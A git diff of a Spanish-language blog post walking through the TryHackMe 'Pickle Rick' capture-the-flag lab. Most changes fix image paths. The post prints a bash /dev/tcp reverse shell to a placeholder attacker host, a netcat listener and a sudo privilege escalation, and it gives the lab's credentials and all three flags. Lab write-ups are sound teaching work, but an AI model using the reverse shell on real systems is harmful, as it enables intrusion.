@@ -8,7 +8,7 @@ toc: true
 math: false
 mermaid: true
 image:
-  path: assets\img\TryHackMe\PickleRick\rickymorty.png
+  path: assets/img/TryHackMe/PickleRick/rickymorty.png
 ---
 
 ## Target
@@ -61,11 +61,11 @@ Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
 
 Web Principal
 
-![Web principal](assets\img\TryHackMe\PickleRick\web.png)
+![Web principal](assets/img/TryHackMe/PickleRick/web.png)
 
 Revisamos el codigo fuente de la pagina y vemos un nombre de usuario, `R1ckRul3s`.
 
-![username](assets\img\TryHackMe\PickleRick\username.png)
+![username](assets/img/TryHackMe/PickleRick/username.png)
 
 Una vez analizado el código fuente, procedemos a realizar un **fuzzing de directorios** utilizando **FFUF** para buscar archivos o directorios ocultos en el servidor web.
 
@@ -115,21 +115,21 @@ denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
 La pagina robots.txt contiene algo de texto. ¿Qué puede ser?
 `Wubbalubbadubdub`
 
-![robots.txt](assets\img\TryHackMe\PickleRick\robotstxt.png)
+![robots.txt](assets/img/TryHackMe/PickleRick/robotstxt.png)
 
 Revisamos login.php, y efectivamente es un panel de login.
 Probamos con los datos recopilados:
 - Username: **R1ckRul3s**
 - Password: **Wubbalubbadubdub**
 
-![login](assets\img\TryHackMe\PickleRick\login.png)
+![login](assets/img/TryHackMe/PickleRick/login.png)
 
 Perfecto, redirige a portal.php que contiene un panel para ejecutar comandos de forma remota.
-![portal](assets\img\TryHackMe\PickleRick\portal.png)
+![portal](assets/img/TryHackMe/PickleRick/portal.png)
 
 Primero identificamos que usuario es en el sistema sabiendo que el sistema operativo es Linux.
 
-![whoami](assets\img\TryHackMe\PickleRick\whoami.png)
+![whoami](assets/img/TryHackMe/PickleRick/whoami.png)
 
 El usuario `www-data` es el usuario por defecto de Apache en distribuciones Linux (como Ubuntu).
 
@@ -147,21 +147,21 @@ ls -la
 | :--- | :--- |
 | **-la** | **Lista Detallada Completa:** Muestra el formato largo (`-l`, con permisos, propietario y tamaño) e incluye **todos los archivos** (`-a`), incluidos los ocultos (que empiezan con un punto, ej. `.bashrc`). |
 
-![ls-la](assets\img\TryHackMe\PickleRick\ls-la.png)
+![ls-la](assets/img/TryHackMe/PickleRick/ls-la.png)
 
 Vemos dos archivos interesantes
 - Sup3rS3cretPickl3Ingred.txt
 - clue.txt
 
 Probamos a mostrar el contenido del archivo con el comando `cat`, pero nos dice que el comando esta bloqueado por lo que probaremos con otro comando.
-![cat](assets\img\TryHackMe\PickleRick\cat.png)
+![cat](assets/img/TryHackMe/PickleRick/cat.png)
 
 Probamos con el comando `less`, less es un visor de archivos de comandos de Linux/Unix que permite a los usuarios ver el contenido de archivos de texto.
-![less](assets\img\TryHackMe\PickleRick\less.png)
+![less](assets/img/TryHackMe/PickleRick/less.png)
 Y nos muestra una posible flag o nombre de pocima: `mr. meeseek hair`, comprobamos y efectivamente es una flag (1/3).
 
 Probamos con el archivo clue.txt, devuelve una pista.
-![clue](assets\img\TryHackMe\PickleRick\clue.png)
+![clue](assets/img/TryHackMe/PickleRick/clue.png)
 
 
 Para facilitar la enumeración y el manejo de la sesión, generamos una Reverse Shell desde el panel RCE hacia nuestra máquina.
@@ -172,16 +172,16 @@ Máquina Atacante (Listener): Configuramos Netcat en el puerto 4000.
 ```bash
 nc -lvnp 4000
 ```
-![nc](assets\img\TryHackMe\PickleRick\nc.png)
+![nc](assets/img/TryHackMe/PickleRick/nc.png)
 
 Máquina Víctima (Payload): Elegimos esta sintaxis de Bash por ser la más fiable, ya que garantiza la correcta redirección de la entrada (STDIN), salida (STDOUT) y errores (STDERR) a través de la conexión TCP:
 ```bash
-bash -c "bash -i &>/dev/tcp/ip-maquina-atacante/puerto-listening <&1"
+bash -c "bash -i &>/dev/tcp/your-ip/puerto-listening <&1"
 ```
-![bash](assets\img\TryHackMe\PickleRick\bash.png)
+![bash](assets/img/TryHackMe/PickleRick/bash.png)
 
 Una vez conectados, obtenemos una shell de bajo privilegio como www-data.
-![reverseshell](assets\img\TryHackMe\PickleRick\reverseshell.png)
+![reverseshell](assets/img/TryHackMe/PickleRick/reverseshell.png)
 
 ## Escalada de privilegios
 
@@ -193,7 +193,7 @@ Verificamos si nuestro usuario tiene permisos para ejecutar comandos como otros 
 ```bash
 sudo -l
 ```
-![sudo-l](assets\img\TryHackMe\PickleRick\sudo-l.png)
+![sudo-l](assets/img/TryHackMe/PickleRick/sudo-l.png)
 
 El resultado es:
 ```text
@@ -202,14 +202,14 @@ User www-data may run the following commands on ip-10-10-98-8:
 ```
 Esto significa que el usuario www-data puede ejecutar cualquier comando como cualquier usuario sin requerir una contraseña.
 
-![flag2](assets\img\TryHackMe\PickleRick\flag2.png)
+![flag2](assets/img/TryHackMe/PickleRick/flag2.png)
 
 Obtenemos la segunda flag (2/3):
 - `1 jerry tear`
 
 Investigamos un poco mas los ficheros como root, y encontramos un archivo llamado 3rd.txt que contiene la tercera flag.
 
-![flag3](assets\img\TryHackMe\PickleRick\flag3.png)
+![flag3](assets/img/TryHackMe/PickleRick/flag3.png)
 
 Obtenemos la tercera flag (3/3) Completado!
 - `fleeb juice`
